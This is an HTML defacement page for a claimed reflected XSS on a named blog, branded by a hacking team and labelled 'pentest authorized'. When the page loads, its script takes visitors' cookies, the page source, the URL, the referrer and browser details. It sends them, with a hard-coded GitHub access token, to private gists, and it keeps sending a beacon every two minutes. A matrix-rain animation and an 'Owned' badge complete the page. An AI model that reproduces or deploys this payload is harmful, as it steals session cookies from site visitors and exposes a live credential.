<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HACKED - Team JundAlNabi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: linear-gradient(45deg, #000 0%, #111 25%, #f00 75%, #800 100%);
            color: #0f0; 
            font-family: 'Courier New', monospace;
            font-size: clamp(16px, 4vw, 32px);
            height: 100vh; 
            overflow: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            text-shadow: 0 0 20px lime;
        }
        h1 { font-size: 1.2em; letter-spacing: 4px; margin-bottom: 10px; }
        h2 { color: #ff0; font-size: 2.5em; margin: 15px 0; text-shadow: 0 0 40px #ff0; animation: pulse 2s infinite; }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.7} }
        .beacon { 
            position: fixed; bottom: 20px; right: 20px; 
            background: rgba(0,0,0,.95); color: #f00; 
            font-size: 12px; line-height: 1.4; padding: 15px 18px;
            border: 3px solid #f00; border-radius: 8px;
            box-shadow: 0 0 25px #f00; font-weight: bold;
            white-space: nowrap;
        }
        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: .25; }
    </style>
</head>
<body>
    <h1>PENTEST AUTHORIZED</h1>
    <h2>Team JundAlNabi</h2>
    <p style="font-size: .65em; margin: 25px 0 40px; color: #ccc;">
        blog.thewiki.in/search.php &lt;script&gt;<br>
        Reflected XSS | Status: VULNERABLE
    </p>
    <canvas id="matrix"></canvas>
    <div class="beacon" id="beacon">
        🔴 VULNERABLE<br>
        Owned: <span id="timestamp"></span><br>
        nppmrj.in
    </div>

    <script>
        // 1. EXFIL TO GITHUB GIST
        const TOKEN = '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';
        const gistData = {
            description: `blog.thewiki.in XSS Dump - ${new Date().toISOString()}`,
            public: false,
            files: {
                "cookies.txt": { content: `[+] Cookies: ${document.cookie}\n[+] URL: ${location.href}\n[+] Referrer: ${document.referrer}` },
                "page_source.html": { content: document.documentElement.outerHTML.slice(0, 45000) },
                "metadata.txt": { content: `User-Agent: ${navigator.userAgent}\nScreen: ${screen.width}x${screen.height}\nPlugins: ${navigator.plugins.length}\nLanguage: ${navigator.language}\nTimestamp: ${new Date().toISOString()}` }
            }
        };

        fetch('https://api.github.com/gists', {
            method: 'POST',
            headers: { 
                'Authorization': `token ${TOKEN}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(gistData)
        }).then(r => r.json()).then(data => {
            console.log('✅ Gist created:', data.html_url);
            document.getElementById('beacon').innerHTML += `<br>📤 Gist: ${data.id.slice(-7)}`;
        }).catch(e => console.error('Gist failed:', e));

        // 2. MATRIX RAIN
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const chars = '01ハックXSS Pentestチームジュンダルナビ'.split('');
        const fontSize = 16;
        const cols = Math.floor(canvas.width / fontSize);
        const drops = Array(cols).fill(1);
        
        function draw() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.08)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#0f3';
            ctx.font = `${fontSize}px monospace`;
            
            drops.forEach((y, i) => {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, y * fontSize);
                drops[i] = y > canvas.height && Math.random() < 0.975 ? 0 : y + 0.05;
            });
            requestAnimationFrame(draw);
        }
        draw();

        // 3. TIMESTAMP & BEACON
        function updateTime() {
            document.getElementById('timestamp').textContent = new Date().toLocaleString('en-US', {timeZone: 'Asia/Karachi'});
        }
        updateTime();
        setInterval(updateTime, 1000);

        // 4. PERSISTENT BEACON (every 2min)
        setInterval(() => {
            fetch('https://api.github.com/gists', {
                method: 'POST',
                headers: { 'Authorization': `token ${TOKEN}`, 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    description: `[BEACON] blog.thewiki.in - ${performance.now()}`,
                    public: false,
                    files: { ping: { content: `Active: ${new Date().toISOString()}` } }
                })
            });
        }, 120000);
    </script>
</body>
</html>
